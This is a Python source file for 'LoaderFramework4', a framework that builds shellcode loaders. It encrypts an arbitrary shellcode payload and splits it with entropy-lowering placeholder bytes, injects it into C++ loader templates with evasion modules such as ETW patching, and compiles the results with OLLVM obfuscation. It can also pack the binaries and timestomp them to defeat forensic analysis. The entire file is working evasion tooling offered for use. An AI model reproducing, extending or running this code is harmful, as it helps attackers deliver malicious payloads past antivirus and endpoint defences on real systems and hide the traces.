import os
import sys
import shutil
import glob
from distutils.dir_util import copy_tree
from termcolor import colored
import argparse
import subprocess
import time
import random
import string
import json
from Crypto.Cipher import AES
import os
import hashlib
from pathlib import Path
import binascii
import filedate
import os
from datetime import datetime


errors = 0

#welcome banner
banner = f"""

█   █▀█ ▄▀█ █▀▄ █▀▀ █▀█ █▀▀ █▀█ ▄▀█ █▀▄▀█ █▀▀ █░█░█ █▀█ █▀█ █▄▀ █░█
█▄▄ █▄█ █▀█ █▄▀ ██▄ █▀▄ █▀  █▀▄ █▀█ █░▀░█ ██▄ ▀▄▀▄▀ █▄█ █▀▄ █░█ ▀▀█

"""
originaldir = os.path.dirname(os.path.abspath(__file__))
#print functions
def printsuccess(msg):
  print(colored(colored("[+] ","green") + msg,attrs=["bold"]))

def printfail(msg):
  global errors
  print(colored("[!] ","red",attrs=['bold']) + colored(msg,"yellow",attrs=['bold']))
  errors += 1

def printbold(msg):
  print(colored(msg,attrs=['bold']))

def printmsg(msg):
  print(colored("[*] ","cyan",attrs=["bold"]) + msg)

#convert the .bin file to a char array that can be put into the payload safely
def bin2sc(filepath):

  bytesread = open(filepath, 'rb').read()
  bytes_string = bytesread.hex()
  n = 2
  bytes_array = [bytes_string[i:i+n] for i in range(0, len(bytes_string), n)]
  # Allow escaped \xNN sequences to be interpreted as bytes (not literal backslash-x)
  if args.placeholder is not None:
    try:
      placeholder_raw = args.placeholder.encode('utf-8').decode('unicode_escape').encode('latin1')
    except Exception:
      placeholder_raw = args.placeholder.encode('utf-8')
  else:
    placeholder_raw = b"\x00" * 10
  if len(placeholder_raw) == 0:
    placeholder_raw = b"\x00" * 10
  placeholder_bytes = [f"{b:02x}" for b in placeholder_raw]

  # optional placeholder insertion before splitting (driven by entropy fix)
  placeholder_interval = None
  if args.entropy_fix is not None:
    entropy_value = args.entropy_fix
    if entropy_value > 9:
      entropy_value = 9
    if entropy_value <= 0:
      printfail("Entropy fix value must be greater than 0")
      sys.exit(2)
    placeholder_interval = 50 - 5 * entropy_value

  if placeholder_interval:
    interval = placeholder_interval
    new_bytes_array = []
    for i in range(0, len(bytes_array), interval):
      new_bytes_array.extend(bytes_array[i:i+interval])
      if i + interval < len(bytes_array):
        new_bytes_array.extend(placeholder_bytes)
    bytes_array = new_bytes_array

  split_enabled = args.split is not None
  chunk_size = args.split if split_enabled else 30
  if split_enabled and (chunk_size is None or chunk_size <= 0):
    chunk_size = 30

  if not split_enabled:
    bytes_array_formatted = ['0x{} '.format(bytestr) for bytestr in bytes_array]
    bytes_string_final = ','.join(bytes_array_formatted)
    lines = [f"    static unsigned char sc[] = {{{bytes_string_final}}};"]
  else:
    chunk_size = int(chunk_size)
    chunks = [bytes_array[i:i+chunk_size] for i in range(0, len(bytes_array), chunk_size)]

    lines = []
    for idx, chunk in enumerate(chunks):
      chunk_formatted = ','.join([f'0x{byte}' for byte in chunk])
      lines.append(f"    static unsigned char sc_part{idx}[] = {{{chunk_formatted}}};")

    lines.append(f"    static unsigned char sc[{len(bytes_array)}];")
    part_names = [f"sc_part{idx}" for idx in range(len(chunks))]
    part_sizes = [f"sizeof(sc_part{idx})" for idx in range(len(chunks))]
    lines.append(f"    static const unsigned char* sc_parts[] = {{{', '.join(part_names)}}};")
    lines.append(f"    static const size_t sc_sizes[] = {{{', '.join(part_sizes)}}};")
    lines.append("    size_t sc_offset = 0;")
    lines.append("    for (size_t i = 0; i < sizeof(sc_parts) / sizeof(sc_parts[0]); ++i) {")
    lines.append("        memcpy(sc + sc_offset, sc_parts[i], sc_sizes[i]);")
    lines.append("        sc_offset += sc_sizes[i];")
    lines.append("    }")

  # remove placeholders after concatenation, if requested
  if placeholder_interval:
    placeholder_formatted = ','.join([f'0x{byte}' for byte in placeholder_bytes])
    lines.append(f"    static unsigned char sc_placeholder[] = {{{placeholder_formatted}}};")
    lines.append("    size_t sc_len = sizeof(sc);")
    lines.append("    size_t i = 0;")
    lines.append("    while (i + sizeof(sc_placeholder) <= sc_len) {")
    lines.append("        if (memcmp(sc + i, sc_placeholder, sizeof(sc_placeholder)) == 0) {")
    lines.append("            memmove(sc + i, sc + i + sizeof(sc_placeholder), sc_len - (i + sizeof(sc_placeholder)));")
    lines.append("            sc_len -= sizeof(sc_placeholder);")
    lines.append("            continue;")
    lines.append("        }")
    lines.append("        i++;")
    lines.append("    }")
  else:
    lines.append("    size_t sc_len = sizeof(sc);")

  ps_shellcode = "\n".join(lines)
  return ps_shellcode


def unix_time_to_custom_format(unix_timestamp):
    try:
        # Convert the Unix timestamp to a datetime object
        dt_object = datetime.fromtimestamp(unix_timestamp)
        
        # Format the datetime object to the desired format
        formatted_time = dt_object.strftime('%d/%m/%Y %H:%M:%S')
        
        return formatted_time
    except ValueError:
        return "Invalid Unix timestamp"

# #convert the .bin file to a char array that can be put into the payload safely
# def bin2sc(filepath):

#   ps_shellcode = 'unsigned char sc[] = {'
#   try:
#     with open(filepath, 'rb') as shellcode:
#       byte = shellcode.read(1)

#       while byte != b'':
#         ps_shellcode += '0x{}, '.format(byte.hex())
#         byte = shellcode.read(1)
#   except:
#     printfail(f"Could not open file {filepath}")


#   ps_shellcode = ps_shellcode[:-2] #get rid of the last whitespace and comma
#   ps_shellcode += '};'
#   return ps_shellcode

#clean print statements from payloads
def cleanprints(dir):
  bad_words = ['printf','getchar']
  filelist = os.listdir(dir)
  for file in filelist:
    try:
      with open(f"{dir}/{file}") as oldfile:
        clean = ""
        for line in oldfile:
            if not any(bad_word in line for bad_word in bad_words):
                clean += line
        with open(f"{dir}/{file}","w") as oldfile:
          oldfile.write(clean)
    except:
      continue

def getcompiled(path,name):
  original_directory = os.getcwd()
  os.chdir(path)
  compiled = ""
  files_in_dir = os.listdir(os.getcwd())
  os.chdir(original_directory)
  for x in files_in_dir:
    if name in x:
      compiled = x
      return x


#add an evasion. This is done by copying the .h files over and adding the #include line
def add_evasion(evasions,dir):
  init_evasion = ""
  evasion_imports = ""
  headers = []
  for evasion in evasions:
    copy_tree(f"evasion/{evasion}", dir)
    init_evasion += open(f"evasion/{evasion}/init.txt","r").read() + "\n"
    headers += [f"#include \"{i}\"" for i in os.listdir(f"evasion/{evasion}") if i.endswith(".h") or i.endswith(".hpp")]

  headers = list(dict.fromkeys(headers)) #remove duplicates
  evasion_imports = "\n".join(headers)

  contents_of_template = open(f"{dir}/run.cpp","r").read()
  contents_of_template2 = evasion_imports + "\n" + contents_of_template.replace("//%_EVASION_%",init_evasion)
  with open(f"{dir}/run.cpp","w") as f:
    f.write(contents_of_template2)


#the main generator component
def build_one(template,write,execute,evasions,decrypt,outputdir):
    global shellcode

    #copy the core header files and shellcode into the build directory
    try:
      copy_tree(f"write/{write}", outputdir)
      copy_tree(f"exec/{execute}", outputdir)
      copy_tree(f"template/{template}", outputdir)
      copy_tree(f"crypt/{decrypt}", outputdir)
      shutil.copyfile('encrypted.bin', outputdir + "/encrypted.bin")
    except Exception as e:
      printfail(str(e))


    #add the evasions
    add_evasion(evasions,outputdir)
    config = f"{template}({write} + {execute})"
    if not args.debug:
      #if debugging mode is not enabled, clean print statements from payloads
      cleanprints(outputdir)
    if args.shellcode:
      #replace the placeholder //%_SHELLCODE_% with the shellcode char array
      contents_of_template = open(f"{outputdir}/run.cpp","r").read()
      needs_string = (args.entropy_fix is not None) or (args.split is not None)
      if needs_string and "#include <string.h>" not in contents_of_template:
        contents_of_template = "#include <string.h>\n" + contents_of_template
      #replace the placeholder %_KEY_% with the decryption key
      contents_of_template2 = contents_of_template.replace("//%_SHELLCODE_%",shellcode).replace("%_KEY_%",key)
      if args.entropy_fix is not None:
        contents_of_template2 = contents_of_template2.replace("unsigned int payload_len = sizeof(sc);","unsigned int payload_len = (unsigned int)sc_len;")
      with open(f"{outputdir}/run.cpp","w") as f:
        f.write(contents_of_template2)
    printsuccess("Built " + config)

#build all variations chosen
def build_all(templates=[],writes=[],execs=[],evasions=[],decrypt='xor'):
    printbold("\nBuilding...")
    # empty the build folder
    files = glob.glob('build/*')
    for f in files:
        shutil.rmtree(f)
    #if blank, build all variations
    if execs == []:
      execs = os.listdir("exec/")
    if writes == []:
      writes = os.listdir("write/")
    if templates == []:
      templates = os.listdir("template/")

    #build each variation
    for template in templates:
        for write in writes:
            for execute in execs:
                build_one(template,write,execute,evasions,decrypt,f"build/{template}_{write}_{execute}/")

    #if compile is set then run the compile.bat in each template
    if args.compile:
      printbold("\nCompiling...")
      for template in templates:
          for write in writes:
              for execute in execs:    
                compile_dir(f"build/{template}_{write}_{execute}/",f"{template}_{write}_{execute}")
    
      #if --pack is set then try to pack each output binary with the chosen packer
      if args.pack:
        printbold(f"\nPacking ({args.pack})...")
        for template in templates:
            for write in writes:
                for execute in execs:
                  targetfile = getcompiled(f"build/{template}_{write}_{execute}/",f"{template}_{write}_{execute}")  
                  use_packer(f"build/{template}_{write}_{execute}/",targetfile)
      if args.time:
        printbold("\nTimestomping enabled")
        for template in templates:
            for write in writes:
                for execute in execs:
                  try:
                    targetfile = getcompiled(f"build/{template}_{write}_{execute}/",f"{template}_{write}_{execute}")
                    filedate.File(f"build/{template}_{write}_{execute}/{targetfile}").set(
                        created = unix_time_to_custom_format(args.time),
                        modified = unix_time_to_custom_format(args.time),
                        accessed = unix_time_to_custom_format(args.time)
                    )
                    printsuccess(f"Timestomped build/{template}_{write}_{execute}/{targetfile} with unix time {args.time}")
                  except Exception as e:
                    print(e)
                    pass
      

#compile functiongi
def compile_dir(path,name):
  #check for OS
  os.chdir(path)
  if sys.platform == 'win32':
    cmd = ["compile.bat"]
    if args.ollvm:
      cmd.append("--ollvm")
    p = subprocess.Popen(cmd, creationflags=subprocess.CREATE_NO_WINDOW)
  else:
    cmd = ["bash", "compile.sh"]
    if args.ollvm:
      cmd.append("--ollvm")
    p = subprocess.Popen(cmd)
  p.wait()
  try:
    try:
      os.rename(f"run.exe",f"{name}.exe")
    except:
      os.rename(f"run.dll",f"{name}.dll")
    printsuccess(f"Compiled {path}")
  except:
    printfail(f"Compilation of {path} failed")
  os.chdir(originaldir)

def use_packer(path,name):
  os.chdir(originaldir)
  sys.path.insert(0, f'./packer/{args.pack}')
  print(name)
  from pack import pack
  os.chdir(originaldir)
  status = pack(path,name)
  if status == 0:
    printsuccess(f"Packed {path}")
  else:
    printfail(f"Packing {path} failed!")



try:
  print(colored(banner,"green",attrs=['bold']))
except Exception:
  # Fallback for terminals without Unicode support
  print(colored("LoaderFramework4", "green", attrs=["bold"]))




#arg parsing
parser = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter,description=colored("LoaderFramework4","green",attrs=['bold']) + '\nModular shellcode runner generation framework',epilog=colored("Example usage:","green",attrs=['bold']) + '\ngen.py --config loader.json --shellcode calc.bin --compile\ngen.py --all --shellcode calc.bin\ngen.py --templates default --writes virtualalloc,heapalloc --shellcode calc.bin\n ')
parser.add_argument('--compile', action='store_true',help='compile into .exe format')
parser.add_argument('--ollvm', action='store_true',help='enable OLLVM obfuscation flags during compilation')
parser.add_argument('--shellcode', type=str, required=False,help='path to shellcode payload')
parser.add_argument('--evasions', type=str, required=False,help='list of evasions to generate e.g. --evasions patchetw')
parser.add_argument('--execs', type=str, required=False,help='list of execs to generate e.g. --execs switchtofiber,queueuserapc')
parser.add_argument('--writes', type=str, required=False,help='list of writes to generate e.g. --writes heapalloc,virtualalloc')
parser.add_argument('--templates', type=str, required=False,help='list of templates to generate e.g. --execs default')
parser.add_argument('--split', nargs='?', const=30, type=int, required=False,help='split shellcode into multiple arrays before concatenation (default chunk size 30)')
parser.add_argument('--crypt', type=str, required=False,help='encryption algorithm for shellcode. Defaults to XOR.')
parser.add_argument('--enckey', type=str, required=False,help='Custom encryption key. If not set, defaults to a randomly generated key.')
parser.add_argument('--pack', type=str, required=False,help='Packer to use on compiled binaries, if compilation is enabled.')
parser.add_argument('--encode', type=str, required=False,help='Encoder to use on the shellcode')
parser.add_argument('--pad', type=int, required=False,help='Pad shellcode to x bytes')
parser.add_argument('--config', type=str, required=False,help='Use a predefined JSON file containing a config')
parser.add_argument('--all', action='store_true', required=False,help='generate all combinations of templates, writes and execs (SLOW)')
parser.add_argument('--outputdir', type=str, required=False,help='output directory to copy to')
parser.add_argument('--debug', action='store_true', required=False,help='preserve print statements')
parser.add_argument('--list', type=str, required=False,help='List existing modules (template/write/exec/evasion/crypt/packer/config)')
parser.add_argument('--time', type=int, required=False,help='Timestomp compiled binaries with unix time (user input)')
parser.add_argument('--placeholder', type=str, required=False,help='custom placeholder string (default: 10 null bytes)')
parser.add_argument('--entropy-fix', type=int, required=False,help='insert placeholder every (50-5*value) bytes; value capped at 9')


if len(sys.argv)==1:
    parser.print_help(sys.stderr)
    sys.exit(1)
args = parser.parse_args()

#list modules
if args.list:
  if args.list in ['template','write','exec','evasion','crypt','packer','config','encoder']:
    modulelist = os.listdir(args.list)
    printbold(f"Installed {args.list}s\n")
    for x in modulelist:
      printmsg(x)
    print("\n")
    sys.exit(2)
  else:
    printfail("Unknown module type to list")
    sys.exit(2)

if not args.shellcode:
  printfail("No shellcode provided!")
  sys.exit(2)

execs = []
writes = []
templates = []
evasions = []
crypt = 'xor'

#debug mode
if args.debug:
  print(colored("Debug mode enabled - print statements will be left intact!","yellow",attrs=['bold']))



#print config
if args.templates:
  templates = args.templates.split(",")
if args.execs:
  execs = args.execs.split(",")
if args.writes:
  writes = args.writes.split(",")
if args.evasions:
  evasions = args.evasions.split(",")

if args.split is not None:
  chunk_display = args.split if args.split and args.split > 0 else 30
  printmsg(f"Shellcode split mode enabled ({chunk_display}-byte chunks)")

if args.entropy_fix is not None:
  entropy_value = args.entropy_fix
  if entropy_value > 9:
    printmsg("Entropy fix value capped at 9")
    entropy_value = 9
    args.entropy_fix = entropy_value
  if entropy_value <= 0:
    printfail("Entropy fix value must be greater than 0")
    sys.exit(2)
  placeholder_interval = 50 - 5 * entropy_value
  printmsg(f"Entropy fix enabled (value {entropy_value}); placeholders every {placeholder_interval} bytes")
  if args.placeholder:
    placeholder_len = len(args.placeholder.encode('utf-8'))
    printmsg(f"Custom placeholder string in use (length {placeholder_len} bytes)")
  else:
    printmsg("Using default placeholder (10 null bytes)")


#config file parsing and loading
if args.config:
  # try:
    printmsg(f"Config file {args.config} loaded")
    configfiletext = open(args.config,"r").read()
    loadercfg = json.loads(configfiletext)
    templates = templates + loadercfg.get('templates',"").split(',') if loadercfg.get('templates') else templates
    writes = writes + loadercfg.get('writes',"").split(',') if loadercfg.get('writes') else writes
    execs = execs + loadercfg.get('execs',"").split(',') if loadercfg.get('execs') else execs
    if loadercfg.get('evasions',"") != "":
      evasions = evasions + loadercfg.get('evasions',"").split(',')
    # optional config-driven options (CLI still wins)
    def cfg_bool(val):
      if isinstance(val,bool):
        return val
      if isinstance(val,str):
        return val.strip().lower() in ["1","true","yes","y","on"]
      return False
    if not args.crypt and loadercfg.get('crypt'):
      args.crypt = loadercfg.get('crypt')
    if not args.enckey and loadercfg.get('enckey'):
      args.enckey = loadercfg.get('enckey')
    if not args.pack and loadercfg.get('pack'):
      args.pack = loadercfg.get('pack')
    if not args.encode and loadercfg.get('encode'):
      args.encode = loadercfg.get('encode')
    if args.pad is None and loadercfg.get('pad') is not None:
      try:
        args.pad = int(loadercfg.get('pad'))
      except:
        pass
    if args.split is None and loadercfg.get('split') is not None:
      try:
        args.split = int(loadercfg.get('split'))
      except:
        pass
    if args.entropy_fix is None:
      ef = loadercfg.get('entropy_fix', loadercfg.get('entropy-fix'))
      if ef is not None:
        try:
          args.entropy_fix = int(ef)
        except:
          pass
    if not args.placeholder and loadercfg.get('placeholder'):
      args.placeholder = loadercfg.get('placeholder')
    if args.time is None and loadercfg.get('time') is not None:
      try:
        args.time = int(loadercfg.get('time'))
      except:
        pass
    if not args.all and loadercfg.get('all') is not None:
      args.all = cfg_bool(loadercfg.get('all'))
    if not args.outputdir and loadercfg.get('outputdir'):
      args.outputdir = loadercfg.get('outputdir')

# de-duplicate selections while preserving order
def dedupe(seq):
  seen = set()
  out = []
  for item in seq:
    if item not in seen and item != "":
      seen.add(item)
      out.append(item)
  return out

templates = dedupe(templates)
writes = dedupe(writes)
execs = dedupe(execs)
evasions = dedupe(evasions)
  # except Exception as e:
  #   printfail("There was a problem parsing the JSON config. Please check the config file for errors.\n    Error: " + str(e))


#print config
if templates != []:
  printmsg(f"Building templates {','.join(templates)}")
else:
  printmsg("No templates specified. Building all variations.")
if writes != []:
  printmsg(f"Building writes {','.join(writes)}")
else:
  printmsg("No writes specified. Building all variations.")
if execs != []:
  printmsg(f"Building execs {','.join(execs)}")
else:
  printmsg("No execs specified. Building all variations.")
if evasions != []:
  printmsg(f"Evasions selected: {','.join(evasions)}")
else:
  printmsg(f"No evasions selected")

#generate a random character key if no key is specified
if not args.enckey:
  key = ''.join(random.choices(string.ascii_uppercase + string.digits + string.ascii_lowercase + '!@#$%^&*()_', k = 32))
  printmsg(f"Random encryption key generated: {key}")
else:
  printmsg(f"Custom encryption key specified: {args.enckey}")
  key = args.enckey



#non default encryption algorithm
if args.crypt:
  crypt = args.crypt
  printmsg(f"Encryption selected: {crypt.upper()}")
else:
  printmsg("No encryption algorithm specified. Defaulting to XOR.")

#encrypt and parse the selected shellcode
sys.path.insert(0, f'./crypt/{crypt}')
printmsg(f"Shellcode selected: {args.shellcode}")
from encrypt import encrypt
scbytes = open(args.shellcode,"rb").read()

#pad the shellcode if required
if args.pad:
  size_of_sc = len(scbytes)
  padamount = args.pad-size_of_sc
  if padamount > 0:
    scbytes = b"\x90" * padamount + scbytes
    printmsg(f"Padded shellcode of size {size_of_sc} to {len(scbytes)} bytes")
  else:
    printmsg(f"Shellcode ({size_of_sc} bytes) was larger than specified pad amount ({args.pad} bytes). Skipping.")

#encoder
if args.encode:
  sys.path.insert(0, f'./encoder/{args.encode}')
  from encode import encode
  printmsg(f"Encoding shellcode ({str(len(scbytes))} bytes) with {args.encode}")
  scbytes = encode(scbytes)
  printmsg(f"Encoding successful. New shellcode size: {str(len(scbytes))} bytes")

  
encrypt(key,scbytes)
shellcode = bin2sc("encrypted.bin")


if args.compile:
  printmsg("Compilation enabled")
  if args.ollvm:
    printmsg("OLLVM obfuscation flags enabled")
  if args.pack:
    printmsg(f"Packing enabled ({args.pack})")
elif args.ollvm:
  printmsg("OLLVM flag specified without --compile; ignoring.")

if args.time is not None:
    printmsg(f"Timestomp compilation enabled with time: {args.time}")

t0 = time.time()
if len(templates) + len(writes) + len(execs) > 0:
  build_all(templates=templates,writes=writes,execs=execs,evasions=evasions,decrypt=crypt)
elif args.all:
  printbold("Building all combinations...")
  build_all()

#copy everything to the output dir, if one is set
if args.outputdir:
  copy_tree('build/',args.outputdir)

#how long did we take?
t1 = time.time()
total = t1-t0

os.remove("encrypted.bin")
#we are done. any errors?
print(colored(f"\nLoaderFramework4 completed in {round(total,2)} seconds","green",attrs=['bold']))
if errors > 0:
  print(colored(f"{errors} errors occurred. Check logs.","red",attrs=['bold']))
